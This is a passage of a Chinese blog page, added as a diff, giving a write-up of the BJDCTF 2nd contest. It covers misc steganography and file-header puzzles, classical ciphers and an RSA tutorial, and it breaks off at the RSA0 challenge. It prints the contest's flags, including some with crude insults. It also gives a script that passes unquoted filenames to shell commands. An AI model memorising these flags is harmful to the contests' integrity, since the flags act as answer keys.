@@ -1,0 +1,2004 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>BJDCTF 2nd writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup,BJDCTF">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍了第二届BJDCTF部分题目的writeup!tcl!">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">BJDCTF 2nd writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/03/21/BJDCTF-2rd-writeup/">
+      BJDCTF 2nd writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年3月21日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍了第二届BJDCTF部分题目的writeup!tcl!</p>
+<a id="more"></a>
+
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="最简单的misc"><a href="#最简单的misc" class="headerlink" title="最简单的misc"></a>最简单的misc</h3><p>下载下来是secret.zip，zip伪加密，搜索标志位<code>14 00 09 00</code>将其替换成<code>14 00 00 00</code></p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321180401.png" style="zoom:80%;">
+
+<p>解压得到secret，hex编辑器查看发现是png图片格式确少文件头</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321180736.png" style="zoom:80%;">
+
+<p>常见文件文件头尾：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)	文件头：FFD8FF	文件尾：FF D9　　　　　　　　　　　　　　　</span><br><span class="line">PNG (png)	文件头：89504E47	文件尾：AE 42 60 82</span><br><span class="line">GIF (gif)	文件头：47494638	文件尾：00 3B                                               ZIP Archive (zip)	文件头：504B0304	文件尾：50 4B</span><br><span class="line">RAR Archive (rar)	文件头：52617221</span><br><span class="line">Wave (wav)	文件头：57415645</span><br><span class="line">AVI (avi)	文件头：41564920</span><br></pre></td></tr></table></figure>
+
+<p>因此我们补上<code>89 50 4E 47</code></p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321181412.png" style="zoom:80%;">
+
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321181522.png" style="zoom:50%;">
+
+<p>16进制转ASCII就得到flag了</p>
+<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>下载下来是<code>Misc-A_Beautiful_Picture-DreamerJack.png</code></p>
+<p>题目考察的是改高度，直接看分辨率也能看出点猫腻</p>
+<p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200321182019.png"></p>
+<p>hxd打开,直接改就能得到flag</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321182243.png" style="zoom:80%;">
+
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321182509.png" style="zoom:50%;">
+
+<h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>下载下来ezbb.jpg，foremost分离出<code>00000061.zip</code>，解压得到<code>里面都是出题人.jpg</code></p>
+<p>发现可以用视频播放器播放，在其中找到了4张二维码，分别截屏下来扫下，得到4个16进制字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">6167696E5F6C</span><br><span class="line">6F76655F59</span><br><span class="line">424A447B696D</span><br><span class="line">316E677D</span><br><span class="line">6167696E5F6C6F76655F59424A447B696D316E677D</span><br><span class="line">BJD&#123;imagin_love_Y1ng&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><p>这题应该是最简单的，想了半年，我这脑子！</p>
+<p>直接strings命令或者Hxd打开就能找到，应该搜索的，哎！要仔细啊！</p>
+<h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p>下载下来是<code>ezbb_r.png</code>，formost分离出来<code>00000000.jpg</code></p>
+<p>两图片都一样也能正常显示，但大小不一样，hxd对比一下,发现多了下面内容</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321222554.png" style="zoom:80%;">
+
+<p>单独分析一下，发现有<code>50 4B</code>很明显是压缩包，<code>FF</code>是多余的删掉，加上zip的头<code>50 4B 03 04</code>,结果如下图</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321222934.png" style="zoom:80%;">
+
+<p>解压得到hint，打开都是#,刚开始以为是神么加密呢，仔细一瞅是二维码</p>
+<p>不过好像扫不了，看知乎大佬的做法是将#替换成■，在sublime里虽然大二维码扫不了，但右边的小二维码能扫出来</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321232911.png" style="zoom:80%;">
+
+<p>不用替换也能扫，sublime真好,扫出来是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od -vtx1 ./draw.png | head -56 | tail -28</span><br></pre></td></tr></table></figure>
+
+<p>直接输入命令，发现</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200323233100.png" style="zoom:80%;">
+
+<p>看到有好多00 ff，把00替换为空会发现</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200323233517.png" style="zoom:67%;">
+
+<p>得到flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;572154976&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h3><p>下载下来是一张图片，查看详细属性发现有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</span><br></pre></td></tr></table></figure>
+
+<p>解密网址：<a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p>
+<p>解密得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gemlove</span><br></pre></td></tr></table></figure>
+
+<p>提示开局一张图，flag全靠猜</p>
+<p>outgess解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r sheng_huo_zhao_zhao.jpg -k gemlove -t 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="TARGZ"><a href="#TARGZ" class="headerlink" title="TARGZ"></a>TARGZ</h3><p>下载下来是<code>hW1ES89jF.tar.gz</code>，file查看发现是zip，不知道密码，拿文件名试下</p>
+<p>发现解压出来了，还是zip加密文件，密码还是文件名</p>
+<p>盗用一下颖奇师傅的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	aa = os.popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">	filename = aa.read().replace(<span class="string">&#x27;decompress.py&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	a = filename.replace(<span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	kind = filetype.guess(filename)</span><br><span class="line">	time.sleep(<span class="number">0.1</span>)</span><br><span class="line">	<span class="keyword">if</span> kind.extension <span class="keyword">is</span> <span class="string">&#x27;zip&#x27;</span>:</span><br><span class="line">		os.system(<span class="string">&quot;mv &#123;&#125; &#123;&#125;.zip&quot;</span>.format(filename, a))</span><br><span class="line">		os.system(<span class="string">&quot;unzip -P &#123;&#125; &#123;&#125;.zip&quot;</span>.format(a,a))</span><br><span class="line">		os.system(<span class="string">&quot;rm *.zip&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">		</span><br></pre></td></tr></table></figure>
+
+<p>flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wow_you_can_rea11y_dance&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="开场曲"><a href="#开场曲" class="headerlink" title="开场曲"></a>开场曲</h3><p>下载下来是mp4，可以看到是mikutap，听力题，干就完事了</p>
+<p>真不好听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;MIKUTAP3313313&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>打开发现是繁体字,一个一个搜发现是flag的拼音</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</span><br><span class="line">bi ji di da kuo hao zhe jiu shi fu lai ge zhi jie jiao le ba da kuo hao</span><br><span class="line">BJD&#123;这就是flag直接交了吧&#125;</span><br><span class="line">BJD&#123;淛匶襫黼瀬鎶軄鶛驕鳓哵&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>gif图片发现是有规律的，每行刚好八个空，符合二进制</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322094932.png" style="zoom:50%;">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01000010 42</span><br><span class="line">01001010 4a</span><br><span class="line">01000100 44</span><br><span class="line">01111011 7b</span><br><span class="line">01001101 4d</span><br><span class="line">00100001 21</span><br><span class="line">01100001 61</span><br><span class="line">00110000 30</span><br><span class="line">01111110 7e</span><br><span class="line">01111101 7d</span><br><span class="line">424a447b4d2161307e7d</span><br><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="灵能精通"><a href="#灵能精通" class="headerlink" title="灵能精通"></a>灵能精通</h3><p>下载下来是jpg，搜了下是圣堂武士密码(Templar Cipher)，有以下规则</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/14907757625323.jpg!33.jpg" style="zoom:80%;">
+
+<p>对照着翻译一下</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322095756.png" style="zoom:80%;">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IMKNIGHTSTEMPLAR</span><br></pre></td></tr></table></figure>
+
+<p>加上flag{}提交就行</p>
+<h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>一串16进制字符串，转字符，后面很像flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</span><br><span class="line"></span><br><span class="line">yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; </span><br></pre></td></tr></table></figure>
+
+<p>维吉尼亚密码,key是yanzi</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;yanzi_jiushige_shabi&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Y1nglish"><a href="#Y1nglish" class="headerlink" title="Y1nglish"></a>Y1nglish</h3><p>题目考察的是词频分析</p>
+<p>quipqiup网址：<a target="_blank" rel="noopener" href="https://quipqiup.com/">https://quipqiup.com/</a></p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200324124416.png" style="zoom:80%;">
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读下原文发现发现networy之类的单词，是说network，所以y变k</p>
+<p>直接读也发现 cracy 这个单词不对劲，应该和暴力破解是同类型的词，所以改成 Cr4ck</p>
+<p>最终flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="RSA0"><a href="#RSA0" class="headerlink" title="RSA0"></a>RSA0</h3><p>还是做做吧，密码学很重要</p>
+<p>nc连上之后得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e&#x3D;9253957</span><br><span class="line"></span><br><span class="line">p+q&#x3D;17197527204660991016930035408263123809040259877847603169542637378767706716259296178344873534778882815738410150250641562554942554918768482130124973070602070</span><br><span class="line"></span><br><span class="line">p-q&#x3D;3283501127743182851935633688746582507377540025586758980645892783208704644171247118527903889977325160707479059917010713382755395132590641870700044646202392</span><br><span class="line"></span><br><span class="line">c&#x3D;30471926191609574952020582344350552307428327163031930955084335343130571238539821732378881111036918563115746281652391681966650016526753032232063719399910844180688651845390340809415668659489594779658849946746379795794343633651023334497181833824386697589969010288147535772453380700224010501799051558826899635431</span><br><span class="line"></span><br><span class="line">flag&#x3D;??????</span><br></pre></td></tr></table></figure>
+
+<p>先介绍一下RSA算法，RSA算法涉及三个参数，N，e，d，公钥为(N，e)，私钥为(N，d)，其中N是两个大素数p，q的乘积。</p>
+<p><strong>加密过程：</strong></p>
+<p>首选取两个互质数 <strong>p</strong> <strong>q</strong>，那么<strong>p * q</strong> 得到 <strong>N</strong>，这时要计算出<strong>φ(N)</strong><br>φ函数φ(N)是指小于或等于N的正整数中与N互质的数的数目。</p>
+<p>根据欧拉公式，前提<strong>p</strong> <strong>q</strong>都是质数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">φ(N) &#x3D; (p-1)*(q-1)</span><br></pre></td></tr></table></figure>
+
+<p>这时候随机选择一个整数<strong>e</strong>，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质</p>
+<p>接着计算<strong>e</strong>对**φ(n)**的模逆元</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e*d ≡ 1 (mod φ(n))</span><br></pre></td></tr></table></figure>
+
+<p>≡是数论中表示同余的符号，可以看到符号右边恒等于1，即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(e*d) mod φ(n)&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>简单的说就是 <strong>e*d</strong>除以**φ(N)**得到的余数为1，可以转化为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e*d - 1 &#x3D; kφ(n)</span><br></pre></td></tr></table></figure>
+
+<p>这时侯我们只有k,d不知道，可以用辗转相除法来计算，神魔是辗转相除法呢？举个例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">比如说一个不定方程3x+5y&#x3D;28,我们要求其整数解</span><br><span class="line">用大的数除以小的数	5&#x3D;3*1+2  --&gt;	余数2&#x3D;5-3*1</span><br><span class="line">然后再用余数与原来的除数相除以，还是大的除以小的	3&#x3D;2*1+1	--&gt;		余数1&#x3D;3-2*1</span><br><span class="line">此时发现除数2(原来的余数)与余数1可以整除，停止除法</span><br><span class="line">2是由第一步来的，所以我们倒推回去</span><br><span class="line">1&#x3D;3-2*1&#x3D;3-(5-3*1)*1&#x3D;3-5+3*1&#x3D;3*2-5	即3*2-5&#x3D;1</span><br><span class="line">等号两端同乘以28</span><br><span class="line">28*2*3+28*(-1)*5&#x3D;28</span><br><span class="line">56*3+(-28)*5&#x3D;28</span><br><span class="line">x&#x3D;56 y&#x3D;-28  特解</span><br></pre></td></tr></table></figure>
+
+<p>同样我们也能求出模逆元</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">首先对余数进行辗转相除：</span><br><span class="line">N &#x3D; A * a0 + r0</span><br><span class="line">A &#x3D; r0 * a1 + r1</span><br><span class="line">r0 &#x3D; r1 * a2 + r2</span><br><span class="line">r1 &#x3D; r2 * a3 + r3</span><br><span class="line">…</span><br><span class="line">rn-2 &#x3D; rn-1 * an + rn</span><br><span class="line">rn-1 &#x3D; rn * an+1 + 0</span><br></pre></td></tr></table></figure>
+
+<p>对上面的商数逆向排列（不含余数为0的商数）：</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/20181114162215283.png" style="zoom:80%;">
+
+<p>其中：<br>b-1 = 1<br>b0 = an<br>bi = an-1 * bi-1 + bi-2<br>如果n为奇数（即商个数为偶数），则bn即为所求的逆元B；<br>如果n为偶数（即商个数为奇数），则N-bn即为所求的逆元B。</p>
+<p><strong>举两个例子：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">求61关于模105的逆。先对余数辗转相除：</span><br><span class="line">105 &#x3D; 61 * 1 + 44</span><br><span class="line">61 &#x3D; 44 * 1 + 17</span><br><span class="line">44 &#x3D; 17 * 2 + 10</span><br><span class="line">17 &#x3D; 10 * 1 + 7</span><br><span class="line">10 &#x3D; 7 * 1 + 3</span><br><span class="line">7 &#x3D; 3 * 2 + 1</span><br><span class="line">3 &#x3D; 1 * 3 + 0</span><br></pre></td></tr></table></figure>
+
+<p>将商数逆序排列：</p>
+<p><img src="/2020/03/21/BJDCTF-2rd-writeup/20181114163426852.png"></p>
+<p>由于商的个数为偶数，因此31即为61关于模105的逆元。(31 * 61 = 105 * 18 + 1)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">求31关于模105的逆，先对余数辗转相除：</span><br><span class="line">105 &#x3D; 31 * 3 + 12</span><br><span class="line">31 &#x3D; 12 * 2 + 7</span><br><span class="line">12 &#x3D; 7 * 1 + 5</span><br><span class="line">7 &#x3D; 5 * 1 + 2</span><br><span class="line">5 &#x3D; 2 * 2 + 1</span><br><span class="line">2 &#x3D; 1 * 2 + 0</span><br></pre></td></tr></table></figure>
+
+<p>将商数逆序排列：</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/20181114163834643.png" style="zoom:80%;">
+
+<p>由于商的个数为奇数，因此105-44=61即为31关于105的逆元</p>
+<p>知道模逆元怎末求得了，然后我们就进行加密吗，m是明文，c是密文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m^e ≡ c (mod N)</span><br></pre></td></tr></table></figure>
+
+<p>解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c^d ≡ m (mod N)</span><br></pre></td></tr></table></figure>
+
+<p>再回到这道题</p>
